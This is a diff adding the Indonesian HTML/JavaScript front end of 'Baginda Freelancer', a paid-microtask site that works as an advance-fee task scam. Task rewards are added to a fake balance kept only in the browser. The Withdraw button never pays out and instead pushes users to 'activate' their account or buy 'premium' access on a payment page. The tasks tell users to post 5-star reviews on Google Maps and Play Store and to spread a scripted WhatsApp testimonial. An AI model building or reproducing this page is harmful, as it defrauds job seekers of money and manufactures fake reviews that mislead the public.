@@ -1,0 +1,1041 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Baginda Freelancer - Official Finishing 2026</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { 
+            --primary: #1e3a8a; --accent: #2563eb; --bg-light: #f8fafc; --success: #10b981; --danger: #ef4444; 
+            --btn-blue: #2563eb; --btn-blue-shadow: #1e40af;
+            --btn-red: #ef4444; --btn-red-shadow: #b91c1c;
+            --btn-gray: #e2e8f0; --btn-gray-shadow: #cbd5e1;
+            --text-muted: #64748b;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', 'Inter', sans-serif; }
+        body { background-color: var(--bg-light); color: #1e293b; overflow-x: hidden; }
+
+        /* PAGE CONTROL */
+        #landing-page, #dashboard-page { display: none; }
+
+        /* POSTER & OVERLAY */
+        #laura-overlay { 
+            position: fixed; inset: 0; background: #000 url('./posteriklan.jpg') no-repeat center center; 
+            background-size: cover; z-index: 10000; display: flex; flex-direction: column; 
+            align-items: center; justify-content: center; padding: 20px;
+        }
+        #laura-text { color: white; font-size: 1.3rem; font-weight: 800; text-align: center; text-shadow: 2px 2px 10px rgba(0,0,0,1); margin-bottom: 25px; transition: opacity 0.5s; }
+
+        .hero-header {
+            background: linear-gradient(180deg, #3b82f6 0%, #1e3a8a 100%);
+            padding: 60px 20px; text-align: center; border-bottom-left-radius: 60px;
+            border-bottom-right-radius: 60px; box-shadow: 0 15px 35px rgba(30, 58, 138, 0.2);
+            position: relative;
+        }
+        .logo-img { width: 220px; margin-bottom: 35px; filter: drop-shadow(0 5px 15px rgba(0,0,0,0.2)); }
+
+        /* TOMBOL 3D TEBAL */
+        .btn-3d { 
+            padding: 16px; border-radius: 16px; border: none; font-weight: 800; 
+            cursor: pointer; text-transform: uppercase; transition: 0.1s; 
+            display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 0.85rem;
+        }
+        .btn-blue-3d { background: var(--btn-blue); color: white; box-shadow: 0 6px 0 var(--btn-blue-shadow); }
+        .btn-red-3d { background: var(--btn-red); color: white; box-shadow: 0 6px 0 var(--btn-red-shadow); }
+        .btn-gray-3d { background: var(--btn-gray); color: #94a3b8; box-shadow: 0 6px 0 var(--btn-gray-shadow); }
+        .btn-3d:active { transform: translateY(4px); box-shadow: 0 2px 0 transparent; }
+
+        /* FORMS & MODALS */
+    .form-overlay {
+        position: fixed;
+        inset: 0;
+        background: rgba(0,0,0,0.8);
+        z-index: 9000;
+        display: none;
+        overflow-y: auto;
+        padding: 20px;
+        backdrop-filter: blur(5px);
+        -webkit-overflow-scrolling: touch;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .card {
+        background: white;
+        padding: 25px;
+        border-radius: 30px;
+        width: 100%;
+        max-width: 400px;
+        margin: auto;
+        position: relative;
+        box-shadow: 0 25px 50px rgba(0,0,0,0.5);
+        box-sizing: border-box;
+    }
+
+    .close-form { 
+        position: absolute; 
+        top: 15px; 
+        right: 20px; 
+        font-size: 1.8rem; 
+        color: #cbd5e1;
+        cursor: pointer; 
+        z-index: 9100; 
+        font-weight: bold; 
+    }
+
+    .form-group { 
+        margin-bottom: 15px; 
+        position: relative; 
+        text-align: left; 
+    }
+        label { font-size: 0.7rem; font-weight: 800; color: var(--text-muted); display: block; margin-bottom: 6px; text-transform: uppercase; }
+        input, select { width: 100%; padding: 14px; border: 2px solid #f1f5f9; border-radius: 14px; font-size: 0.9rem; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--accent); }
+        .eye-icon { position: absolute; right: 15px; top: 34px; color: #cbd5e1; cursor: pointer; font-size: 1.1rem; }
+
+        /* DASHBOARD COMPONENTS */
+        .wallet-card {
+            background: linear-gradient(135deg, #0f172a 0%, #1e40af 100%);
+            color: white; padding: 30px; border-radius: 35px; position: relative; overflow: hidden;
+            box-shadow: 0 25px 50px -12px rgba(15, 23, 42, 0.4); margin-bottom: 25px;
+        }
+        .icon-cpu { position: absolute; top: 25px; right: 25px; font-size: 2.2rem; opacity: 0.25; }
+        .balance-amount { font-size: 3rem; font-weight: 800; margin-bottom: 10px; letter-spacing: -1px; }
+        .divider-line { width: 100%; height: 1px; background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent); margin-bottom: 15px; }
+
+        /* FLOATING CS LAURA (RIGHT SIDE) */
+        .cs-laura-float {
+            position: fixed; bottom: 100px; right: 25px; z-index: 1000;
+            display: flex; flex-direction: column; align-items: center; gap: 6px;
+        }
+        .headset-circle {
+            width: 60px; height: 60px; background: white; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 10px 20px rgba(0,0,0,0.2); border: 2.5px solid var(--primary);
+        }
+        .headset-circle i { font-size: 1.8rem; color: var(--primary); }
+        .cs-text { font-size: 0.7rem; font-weight: 900; color: var(--primary); background: white; padding: 2px 10px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
+
+        /* NAV BOTTOM (ORIGINAL SIZE) */
+        .bottom-nav { position: fixed; bottom: 0; left: 0; width: 100%; background: white; display: flex; padding: 12px 0; border-top: 1px solid #f1f5f9; z-index: 8000; box-shadow: 0 -5px 20px rgba(0,0,0,0.05); }
+        .nav-item { flex: 1; text-align: center; color: #94a3b8; font-size: 0.85rem; cursor: pointer; transition: 0.2s; }
+        .nav-item i { font-size: 1.5rem; display: block; margin-bottom: 4px; }
+        .nav-item.active { color: var(--primary); font-weight: 800; transform: translateY(-3px); }
+
+        /* STATUS MODAL (CUSTOM NOTIFICATION) */
+        #modal-status { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 20000; display: none; align-items: center; justify-content: center; text-align: center; }
+        .status-box { background: white; padding: 45px 30px; border-radius: 40px; width: 90%; max-width: 370px; }
+        .loader { width: 55px; height: 55px; border: 6px solid #f3f3f3; border-top: 6px solid var(--accent); border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        .status-icon { font-size: 4.5rem; margin-bottom: 20px; display: none; }
+        .success-v { color: var(--success); }
+        .error-x { color: var(--danger); }
+        @keyframes spin { 100% { transform: rotate(360deg); } }
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-12px);} 60% {transform: translateY(-6px);} }
+
+        /* LEGAL & PROFILE */
+        .legal-content-box { height: 250px; overflow-y: auto; text-align: left; font-size: 0.8rem; color: var(--text-muted); line-height: 1.7; padding-right: 10px; }
+        .data-row { display: flex; justify-content: space-between; padding: 14px 0; border-bottom: 1px solid #f8fafc; font-size: 0.85rem; }
+        .data-label { color: var(--text-muted); font-weight: 500; }
+        .data-value { font-weight: 700; color: #1e293b; }
+    </style>
+</head>
+<body>
+
+    <div id="landing-page">
+        <div id="laura-overlay">
+            <div id="laura-text"></div>
+            <button class="btn-3d btn-blue-3d" style="padding: 16px 50px;" onclick="startApp()">Mulai Sekarang</button>
+        </div>
+
+        <div id="main-content">
+            <div class="hero-header">
+                <img src="logobaginda.png" class="logo-img">
+                <div style="display:flex; gap:18px; justify-content:center; padding:0 25px;">
+                    <button class="btn-3d btn-blue-3d" style="flex:1;" onclick="openForm('register')">Register</button>
+                    <button class="btn-3d btn-blue-3d" style="flex:1; background:white; color:var(--primary); box-shadow:0 6px 0 #cbd5e1;" onclick="openForm('login')">Log In</button>
+                </div>
+            </div>
+
+            <div style="text-align:center; padding: 30px;">
+                <img src="postercslaura.png" style="width:100%; max-width:420px; border-radius:30px; border:6px solid white; box-shadow:0 15px 30px rgba(0,0,0,0.12);">
+                <div style="margin: 25px 0;"><i class="fas fa-chevron-down" style="font-size: 2rem; color: var(--primary); animation: bounce 2s infinite; cursor: pointer;" onclick="scrollToLegal()"></i></div>
+
+                <div id="legal-section" style="background:white; padding:30px; border-radius:30px; border:1px solid #e2e8f0;">
+                    <h3 style="margin-bottom:15px; color:var(--primary); font-weight:800;">Syarat & Kebijakan Platform</h3>
+                    <div class="legal-content-box" id="main-legal-text">
+                        <p><b>1. Ketentuan Pengguna:</b> Dengan mendaftar di Baginda Freelancer, Anda setuju bahwa satu identitas (Email, Nomor WhatsApp, dan Nomor Rekening) hanya dapat digunakan untuk satu akun resmi. Pelanggaran berupa duplikasi data akan mengakibatkan pemblokiran akun secara permanen.</p><br>
+                        <p><b>2. Keamanan Transaksi:</b> Platform kami menggunakan teknologi enkripsi tingkat tinggi untuk menjaga setiap aktivitas keuangan Anda. Seluruh penarikan dana wajib menggunakan rekening yang telah didaftarkan pertama kali.</p><br>
+                        <p><b>3. Kebijakan Privasi:</b> Kami menjamin kerahasiaan data pribadi Anda dan tidak akan membagikannya kepada pihak ketiga tanpa izin resmi.</p>
+                    </div>
+                </div>
+                <p style="margin-top: 45px; font-size: 0.8rem; color: #94a3b8; font-weight: 700;">&copy; 2026 BAGINDA FREELANCER OFFICIAL</p>
+            </div>
+        </div>
+    </div>
+
+    <div id="dashboard-page">
+        <div id="beranda" class="container" style="display:block; padding:20px;">
+            <div class="cs-laura-new" onclick="window.location.href='https://bagindafreelancer-png.github.io/cslaura/'" 
+     style="cursor: pointer; position: fixed; bottom: 100px; right: 20px; z-index: 10000; display: flex; flex-direction: column; align-items: center; gap: 4px;">
+    <div style="width: 55px; height: 55px; background: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 8px 15px rgba(0,0,0,0.2); border: 2px solid #1e3a8a;">
+        <i class="fas fa-headset" style="font-size: 1.5rem; color: #1e3a8a;"></i>
+    </div>
+    <span style="font-size: 0.65rem; font-weight: 900; color: #1e3a8a; background: white; padding: 2px 8px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); border: 1px solid #1e3a8a;">CS Laura</span>
+</div>
+            <div class="wallet-card">
+                <i class="fas fa-microchip icon-cpu"></i>
+                <span id="d-id-display" style="font-size:0.75rem; font-weight:900; color:#60a5fa; letter-spacing:3px; display:block; margin-bottom:25px;">ID: BF-USER</span>
+                <p style="font-size:0.7rem; opacity:0.8; font-weight:600;">SALDO UTAMA</p>
+                <h1 class="balance-amount" id="d-balance">Rp 0</h1>
+                <div class="divider-line"></div>
+                <div style="font-family:'Courier New', monospace; font-size:0.9rem; letter-spacing:1px;">
+                    <div id="d-bankname">PILIH METODE</div>
+                    <div id="d-norek">0000 0000 0000</div>
+                </div>
+                <div style="position:absolute; bottom:25px; right:30px; font-size:0.65rem; font-weight:900; background:rgba(239,68,68,0.25); padding:6px 14px; border-radius:10px; border:1.5px solid var(--danger); color:var(--danger);">Non-Aktif</div>
+            </div>
+
+            <div style="display:grid; grid-template-columns:1fr 1fr; gap:15px;">
+                <button id="btn-wd-main" class="btn-3d btn-gray-3d" onclick="triggerStatus('error', 'Informasi', 'Saldo Anda belum mencukupi untuk melakukan penarikan.')">Withdraw</button>
+                <button type="button" class="btn-3d btn-blue-3d" onclick="window.open('https://bagindafreelancer-png.github.io/pembayarann/', '_self')">Aktifkan Akun</button>
+            </div>
+<div class="container-tugas">
+    <h2 class="title-section">Daftar Tugas Harian</h2>
+    <div id="taskList"></div>
+
+    <div class="footer-nav">
+        <div id="loading-tugas" class="loader-tugas"></div>
+        <button class="btn-explore-3d" onclick="telusuriTugasLain()">
+    <span class="btn-top">Telusuri Tugas Lain</span>
+</button>
+    </div>
+</div>
+
+<style>
+    .container-tugas { max-width: 600px; margin: 20px auto; font-family: 'Segoe UI', Roboto, sans-serif; padding: 15px; }
+    .title-section { text-align: center; color: #333; margin-bottom: 30px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; }
+    .task-card { background: #ffffff; border-radius: 18px; padding: 20px; margin-bottom: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #f0f0f0; display: flex; flex-direction: column; transition: 0.3s; }
+    .task-header { display: flex; align-items: center; margin-bottom: 18px; }
+    .task-icon { width: 50px; height: 50px; background: #eef5ff; border-radius: 14px; display: flex; align-items: center; justify-content: center; margin-right: 15px; font-size: 22px; color: #007bff; }
+    .task-info-text h4 { margin: 0; color: #2c3e50; font-size: 17px; line-height: 1.3; }
+    .task-info-text p { margin: 6px 0 0; color: #28a745; font-weight: 800; font-size: 18px; }
+    .btn-kerja { width: 100%; padding: 15px; border-radius: 12px; border: none; background: linear-gradient(135deg, #007bff 0%, #0056b3 100%); color: white; font-weight: bold; cursor: pointer; font-size: 15px; box-shadow: 0 5px 15px rgba(0,123,255,0.3); transition: 0.2s; }
+    .btn-locked { background: #bdc3c7; box-shadow: none; cursor: not-allowed; opacity: 0.8; }
+    .btn-explore-3d { background: #004a99; border-radius: 12px; border: none; padding: 0; cursor: pointer; width: 100%; margin-top: 25px; outline: none; }
+    .btn-top { display: block; padding: 16px; border-radius: 12px; font-size: 16px; font-weight: bold; background: #007bff; color: white; transform: translateY(-5px); border: 1px solid #0056b3; transition: 0.1s; }
+    .loader-tugas { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; display: none; margin: 20px auto; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style>
+
+<script>
+    // --- MESIN PENCARI DATA (DATABASE MULTI-AKUN) ---
+function getActiveUser() {
+    const users = JSON.parse(localStorage.getItem('bf_usersDatabase')) || [];
+    const currentId = localStorage.getItem('bf_currentUser');
+    return users.find(u => u.user === currentId);
+}
+
+function saveActiveUser(userData) {
+    let users = JSON.parse(localStorage.getItem('bf_usersDatabase')) || [];
+    const index = users.findIndex(u => u.user === userData.user);
+    if(index !== -1) {
+        users[index] = userData;
+        localStorage.setItem('bf_usersDatabase', JSON.stringify(users));
+    }
+}
+// -----------------------------------------------
+    
+    
+// 2. Fungsi untuk menampilkan angka saldo ke layar (Rumah: d-balance)
+function updateSaldoDisplay() {
+    const activeUser = getActiveUser(); 
+    if (!activeUser) return;
+
+    const saldoElement = document.getElementById('d-balance'); 
+    if (saldoElement) {
+        saldoElement.innerText = `Rp ${Number(activeUser.saldo).toLocaleString('id-ID')}`;
+    }
+    
+    const idDisplay = document.getElementById('d-id-display');
+    if(idDisplay) idDisplay.innerText = "ID: BF-" + activeUser.user.toUpperCase();
+
+    const wdBtn = document.getElementById('btn-wd-main');
+    if (wdBtn) {
+        if (activeUser.saldo > 0) {
+            wdBtn.className = "btn-3d btn-blue-3d"; 
+            wdBtn.onclick = function() {
+                triggerStatus('loading', 'Proses...', 'Sedang menghubungi server penarikan...');
+                setTimeout(() => {
+                    triggerStatus('error', 'Aktivasi Akun', 'Saldo Anda sudah mencukupi. Silakan Aktifkan Akun untuk aktivasi pencairan.');
+                }, 2000);
+            };
+        } else {
+            wdBtn.className = "btn-3d btn-gray-3d";
+            wdBtn.onclick = () => triggerStatus('error', 'Informasi', 'Saldo Anda belum mencukupi.');
+        }
+    }
+}
+    
+
+
+
+// 2. Fungsi Mesin untuk Mencatat Riwayat [cite: 2026-02-01]
+function simpanKeRiwayat(namaTugas, harga) {
+    const activeUser = getActiveUser();
+    if (!activeUser) return;
+
+    const detailTugas = {
+        nama: namaTugas,
+        bonus: harga,
+        tanggal: new Date().toLocaleString('id-ID'),
+        status: 'Sukses'
+    };
+    
+    // Pastikan array riwayat ada di dalam data user
+    if(!activeUser.riwayatAktivitas) {
+        activeUser.riwayatAktivitas = [];
+    }
+    
+    // Masukkan data ke riwayat spesifik user ini
+    activeUser.riwayatAktivitas.push(detailTugas);
+    
+    // Simpan kembali data user yang sudah diupdate ke database utama
+    saveActiveUser(activeUser);
+    
+    // Refresh tampilan layar agar riwayat langsung muncul
+    tampilkanRiwayatKeLayar();
+}
+// 3. Fungsi untuk menampilkan data riwayat ke layar (UI)
+function tampilkanRiwayatKeLayar() {
+    const boxTugas = document.getElementById('box-tugas');
+    const activeUser = getActiveUser();
+    
+    // Ambil riwayat khusus dari data user yang sedang login
+    const riwayatUser = activeUser ? (activeUser.riwayatAktivitas || []) : [];
+    
+    if (riwayatUser.length === 0) {
+        boxTugas.innerHTML = `
+            <i class="fas fa-tasks" style="font-size:3rem; color:#f1f5f9; margin-bottom:15px;"></i>
+            <p style="color:#94a3b8; font-size:0.9rem;">Belum ada tugas yang diselesaikan.</p>
+        `;
+        return;
+    }
+
+    let daftarHTML = '<h4 style="margin-bottom:15px; text-align:left;">Tugas Diselesaikan:</h4>';
+    riwayatUser.slice().reverse().forEach(tugas => {
+        daftarHTML += `
+            <div style="background:#f8fafc; border:1px solid #e2e8f0; border-radius:15px; padding:15px; margin-bottom:10px; text-align:left; display:flex; justify-content:space-between; align-items:center;">
+                <div>
+                    <div style="font-weight:800; font-size:0.85rem; color:#1e293b;">${tugas.nama}</div>
+                    <div style="font-size:0.7rem; color:#94a3b8;">${tugas.tanggal}</div>
+                </div>
+                <div style="text-align:right;">
+                    <div style="color:#10b981; font-weight:800; font-size:0.85rem;">+Rp ${tugas.bonus}</div>
+                    <div style="font-size:0.65rem; background:#d1fae5; color:#065f46; padding:2px 8px; border-radius:10px; display:inline-block;">${tugas.status}</div>
+                </div>
+            </div>`;
+    });
+    boxTugas.innerHTML = daftarHTML;
+}
+        
+    
+    
+
+// Jalankan fungsi ini saat web pertama kali dibuka agar riwayat lama muncul
+
+    const tasks = [
+        { id: 1, name: "Review Restoran Markette", price: "12.500", type: "free", link: "https://www.google.com/maps/search/Restoran+Markette", instr: "Berikan ulasan positif dan berikan bintang 5 di google maps Restoran Markette", warn: "Wajib berada di website tujuan selama 1,5 menit agar tidak gagal.", time: 90 },
+        { id: 2, name: "Follow & Like Rucas.co", price: "10.000", type: "free", link: "https://www.instagram.com/rucas.co?igsh=MXI1ZzJyeXFidXF6Yw==", instr: "Follow akun instagram rucas.co dan like 3 postingan terbaru", warn: "Wajib berada di aplikasi tujuan selama 1,5 menit agar tidak gagal.", time: 90 },
+        { id: 3, name: "Share Website Baginda Freelancer", price: "10.600", type: "free", link: "https://api.whatsapp.com/send?text=Halo!%20Aku%20baru%20saja%20mencoba%20Website%20Baginda%20Freelancer%20dan%20aku%20sangat%20puas%20dengan%20hasilnya.%20Fitur%20pencari%20proyeknya%20sangat%20mudah%20digunakan%20dan%20aku%20bisa%20mendapatkan%20uang%20dengan%20cepat😊%20Aku%20yakin%20kamu%20juga%20akan%20menyukainya.%20Coba deh%20Linknya:%20https://bagindafreelancer-png.github.io/freelancer.id/", instr: "Share website baginda freelancer ke  teman whatsapp kamu", warn: "Wajib berada di aplikasi tujuan selama 1 menit agar tidak gagal.", time: 60 },
+        { id: 4, name: "Share Vidio YouTube", price: "16.000", type: "free", link: "https://youtu.be/le8eGvPBi2o?si=N-T4m0vJzE5I9Kj6", instr: "Share vidio tujuan ke 3 teman kamu", warn: "Tetap berada di website/aplikasi tujuan selama 1 menit biar proses tugas tidak gagal.", time: 60 },
+        { id: 5, name: "Ulasan aplikasi Hago", price: "13.000", type: "free", link: "https://play.google.com/store/apps/details?id=com.yy.hiyo", instr: "Berikan rating 5 dan ulasan positif di aplikasi hago", warn: "User harus tetap di website/aplikasi tujuan selama 1 menit.", time: 60 },
+        { id: 6, name: "Nonton Video YouTube", price: "9.900", type: "free", link: "https://youtu.be/-Z2gIXkOd2s?si=xrtIfjIMCY7Chtth", instr: "Nonton vidio tujuan selama 1 menit dan dapatkan imbalan", warn: "User harus tetap di tujuan selama 1 menit.", time: 60 },
+        { id: 7, name: "Join Saluran WhatsApp", price: "11.300", type: "free", link: "https://whatsapp.com/channel/0029Vaf8LEC29755J1xfZJ1X", instr: "Ikuti Saluran WhatsApp Drama cina dan dapatkan imbalan.", warn: "User harus tetap di tujuan selama 1 menit.", time: 60 },
+        { id: 8, name: "Ulasan Trans Luxury Hotel", price: "21.000", type: "free", link: "https://www.google.com/maps/search/the+trans+luxury+hotel", instr: "Berikan bintang 5 dan ulasan postif", warn: "User harus tetap di tujuan selama 1,5 menit.", time: 90 },
+        { id: 9, name: "Share produk", price: "8.700", type: "free", link: "https://www.google.com/search?q=produk+potensial&tbm=shop", instr: "Share produk tujuan ke 3 teman kamu", warn: "User harus tetap di tujuan selama 1,5 menit.", time: 90 },
+        { id: 10, name: "Review musik", price: "16.000", type: "free", link: "https://youtu.be/fLexgOxsZu0?si=ys-mI4MzuDEE54V1", instr: "dengarkan musik tujuan selama 1 menit", warn: "User harus tetap di tujuan selama 1 menit.", time: 60 },
+        { id: 11, name: "Follow akun Instagram", price: "12.000", type: "free", link: "https://www.instagram.com/suliantoindriaputra?igsh=OXByZmxvZTA3Z3Np", instr: "Follow akun Instagram tujuan", warn: "User harus tetap di tujuan selama 1 menit.", time: 60 },
+        { id: 12, name: "Download aplikasi Dana", price: "10.800", type: "free", link: "https://play.google.com/store/apps/details?id=id.dana", instr: "Unduh aplikasi dana dan dapatkan imbalan", warn: "User harus tetap di tujuan selama 1 menit.", time: 60 },
+        { id: 13, name: "Baca artikel berita", price: "18.000", type: "free", link: "https://nasional.kompas.com/read/2026/01/17/11233351/update-bnpb", instr: "Baca artikel berita selama 1 menit", warn: "User harus tetap di tujuan selama 1 menit.", time: 60 },
+        { id: 14, name: "Ulasan Google Maps TV7", price: "24.800", type: "premium" },
+        { id: 15, name: "Baca artikel berita hot", price: "28.600", type: "premium" },
+        { id: 16, name: "Buat Vidio iklan pendek", price: "289.000", type: "premium" },
+        { id: 17, name: "Desain grafis", price: "88.000", type: "premium" },
+        { id: 18, name: "Share produk Shopee", price: "18.100", type: "premium" },
+        { id: 19, name: "Subscribe Akun YouTube", price: "20.000", type: "premium" },
+        { id: 20, name: "Buat produk digital", price: "53.700", type: "premium" }
+    ];
+
+function renderTugas() {
+    const taskList = document.getElementById('taskList');
+    if (!taskList) return;
+    
+    const activeUser = getActiveUser();
+    if (!activeUser) {
+        taskList.innerHTML = '<p style="text-align:center; color:#94a3b8; padding:20px;">Silakan login untuk melihat tugas.</p>';
+        return;
+    }
+
+    const tugasUserSelesai = Array.isArray(activeUser.tasksSelesai) ? activeUser.tasksSelesai : [];
+    taskList.innerHTML = ''; 
+
+    const tugasTersedia = tasks.filter(t => !tugasUserSelesai.includes(t.id));
+
+    if (tugasTersedia.length === 0) {
+        taskList.innerHTML = `
+            <div style="text-align:center; padding:30px; background:white; border-radius:20px; border:1px dashed #cbd5e1;">
+                <i class="fas fa-check-double" style="font-size:2rem; color:#10b981; margin-bottom:10px;"></i>
+                <p style="color:#64748b; font-weight:600;">Semua tugas hari ini telah selesai!</p>
+            </div>`;
+        return;
+    }
+
+    tugasTersedia.forEach(task => {
+        const div = document.createElement('div');
+        div.className = 'task-card';
+        div.innerHTML = `
+            <div class="task-header">
+                <div class="task-icon"><i class="fas ${task.type === 'premium' ? 'fa-gem' : 'fa-tasks'}"></i></div>
+                <div class="task-info-text"><h4>${task.name}</h4><p>Rp ${task.price}</p></div>
+            </div>
+            <button id="btn-task-${task.id}" class="btn-kerja ${task.type === 'premium' ? 'btn-locked' : ''}" 
+                onclick="${task.type === 'premium' ? 'telusuriTugasLain()' : 'openTaskModal(' + task.id + ')'}">
+                ${task.type === 'premium' ? '<i class="fas fa-lock"></i> Premium Only' : 'Kerjakan Tugas Sekarang'}
+            </button>`;
+        taskList.appendChild(div);
+    });
+}
+    // 1. Fungsi Membuka Modal
+function openTaskModal(id) {
+    const task = tasks.find(t => t.id === id);
+    const modal = document.getElementById('universalModal');
+    const footer = document.getElementById('modalFooter');
+    
+    if (task.type === 'premium') {
+        document.getElementById('modalIcon').innerHTML = '<i class="fas fa-crown" style="color:#ffc107"></i>';
+        document.getElementById('modalTitle').innerText = "Akses Terbatas";
+        document.getElementById('modalInstruksiText').innerText = "Maaf, tugas ini hanya tersedia untuk member Premium.";
+        document.getElementById('instruksiBox').style.display = "block";
+        document.getElementById('peringatanBox').style.display = "none";
+        footer.innerHTML = `<button class="btn-modal-action btn-gold" onclick="window.open('https://bagindafreelancer-png.github.io/pembayarann/', '_self')">Dapatkan Akses Premium</button>`;
+    } else {
+        document.getElementById('modalIcon').innerHTML = '<i class="fas fa-clipboard-check" style="color:#007bff"></i>';
+        document.getElementById('modalTitle').innerText = "Konfirmasi Tugas";
+        document.getElementById('modalInstruksiText').innerText = task.instr;
+        document.getElementById('modalPeringatanText').innerText = task.warn;
+        document.getElementById('instruksiBox').style.display = "block";
+        document.getElementById('peringatanBox').style.display = "block";
+        footer.innerHTML = `<button class="btn-modal-action btn-blue" onclick="startTask('${task.link}', ${task.time}, '${task.price}', ${task.id})">Kerjakan Tugas</button>`;
+    }
+    modal.style.display = 'flex';
+}
+
+// 2. Fungsi Menjalankan Tugas (Poin 3, 5, 8)
+function startTask(link, time, price, id) {
+    const footer = document.getElementById('modalFooter');
+    const instruksi = document.getElementById('instruksiBox');
+    const peringatan = document.getElementById('peringatanBox');
+    
+    // Kode ini lebih ramah untuk aplikasi editor HP
+const openLink = window.open(link, '_blank');
+if (!openLink || openLink.closed || typeof openLink.closed == 'undefined') { 
+    // Jika diblokir aplikasi, arahkan langsung di jendela yang sama
+    window.location.href = link; 
+}
+    instruksi.style.display = 'none';
+    peringatan.innerHTML = `
+        <label>Validasi Sedang Berjalan...</label>
+        <div style="width:100%; background:#eee; border-radius:10px; height:12px; margin:10px 0; overflow:hidden;">
+            <div id="progressBar" style="width:0%; background:#007bff; height:100%; transition: 1s linear;"></div>
+        </div>
+        <p id="timerText" style="text-align:center; font-weight:bold; color:#007bff;">Menunggu ${time} detik...</p>
+    `;
+    
+    footer.innerHTML = `<button class="btn-modal-action" style="background:#ccc;" disabled>Proses Validasi...</button>`;
+
+    let timeLeft = time;
+    let progress = 0;
+    const interval = setInterval(() => {
+        timeLeft--;
+        progress += (100 / time);
+        if(document.getElementById('progressBar')) document.getElementById('progressBar').style.width = progress + "%";
+        if(document.getElementById('timerText')) document.getElementById('timerText').innerText = `Sisa waktu: ${timeLeft} detik`;
+
+        if (timeLeft <= 0) {
+            clearInterval(interval);
+            selesaiTugas(price, id);
+        }
+    }, 1000);
+}
+
+// 3. Fungsi Selesai & Tambah Saldo (Poin 4 & 9)
+function selesaiTugas(price, id) {
+    const numericPrice = parseInt(price.replace('.', ''));
+    
+    // 1. Ambil data asli dari daftar 'tasks' agar nama tugas muncul dengan benar di riwayat
+    const taskAsli = tasks.find(t => t.id === id);
+    const namaTugas = taskAsli ? taskAsli.name : "Tugas Selesai";
+
+    
+
+    
+     // --- PROSES SIMPAN SALDO KE DATABASE ---
+    const activeUser = getActiveUser(); 
+    if(activeUser) {
+        // 1. Tambahkan saldo ke data user tersebut
+        activeUser.saldo = (activeUser.saldo || 0) + numericPrice;
+        
+        // 2. Simpan ID tugas ini ke memori user (agar tidak muncul lagi)
+        if(!activeUser.tasksSelesai) activeUser.tasksSelesai = [];
+        if(!activeUser.tasksSelesai.includes(id)) {
+            activeUser.tasksSelesai.push(id);
+        }
+
+        // 3. Masukkan kembali ke Database Besar
+        saveActiveUser(activeUser); 
+        
+        // 4. Update angka di layar
+        updateSaldoDisplay(); 
+    }
+
+    // 4. Masukkan ke catatan Riwayat Aktivitas
+    simpanKeRiwayat(namaTugas, price);
+
+    // 5. SINKRONISASI: Paksa beranda untuk update daftar tugas (tugas yang baru selesai akan langsung hilang)
+    renderTugas(); 
+
+    // 6. Update tampilan Modal menjadi "Sukses"
+    document.getElementById('modalIcon').innerHTML = '<i class="fas fa-check-circle" style="color:#28a745"></i>';
+    document.getElementById('modalTitle').innerText = "Tugas Valid ✓";
+    document.getElementById('modalBody').innerHTML = `<p>Rp ${price} telah ditambahkan ke saldo.</p>`;
+    document.getElementById('modalFooter').innerHTML = `<button class="btn-modal-action btn-blue" onclick="closeModal()">Selesai</button>`;
+}
+
+function closeModal() {
+    document.getElementById('universalModal').style.display = 'none';
+}
+</script>
+<div id="universalModal" class="modal-overlay-custom">
+    <div class="modal-content-custom">
+        <div id="modalIcon" class="modal-icon-box"></div>
+        <h3 id="modalTitle" style="margin-bottom: 15px; color: #333;"></h3>
+        
+        <div id="modalBody" class="modal-body-content">
+            <div id="instruksiBox" class="info-section">
+                <label>Instruksi Tugas:</label>
+                <p id="modalInstruksiText"></p>
+            </div>
+            <div id="peringatanBox" class="info-section warn">
+                <label>Peringatan Penting:</label>
+                <p id="modalPeringatanText"></p>
+            </div>
+        </div>
+
+        <div id="modalFooter"></div>
+        <p class="btn-close-text" onclick="closeModal()">Batalkan & Tutup</p>
+    </div>
+</div>
+
+<style>
+    /* Style tambahan untuk Modal agar tampil cantik */
+    .modal-overlay-custom { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 10000; backdrop-filter: blur(5px); }
+    .modal-content-custom { background: white; padding: 30px; border-radius: 24px; text-align: center; max-width: 360px; width: 90%; box-shadow: 0 25px 50px rgba(0,0,0,0.3); }
+    .modal-icon-box { font-size: 50px; margin-bottom: 20px; }
+    .info-section { text-align: left; background: #f9f9f9; padding: 15px; border-radius: 12px; margin-bottom: 12px; border: 1px solid #eee; }
+    .info-section label { font-size: 11px; font-weight: 700; color: #999; text-transform: uppercase; display: block; margin-bottom: 5px; }
+    .info-section p { margin: 0; font-size: 14px; color: #444; line-height: 1.6; }
+    .warn { border-left: 5px solid #ff4b2b; background: #fff8f7; }
+    .btn-modal-action { width: 100%; padding: 16px; border-radius: 30px; border: none; color: white; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; transition: 0.2s; }
+    .btn-blue { background: #007bff; }
+    .btn-gold { background: linear-gradient(135deg, #ffd700, #ff8c00); }
+    .btn-close-text { font-size: 13px; color: #bbb; cursor: pointer; margin-top: 20px; }
+</style>
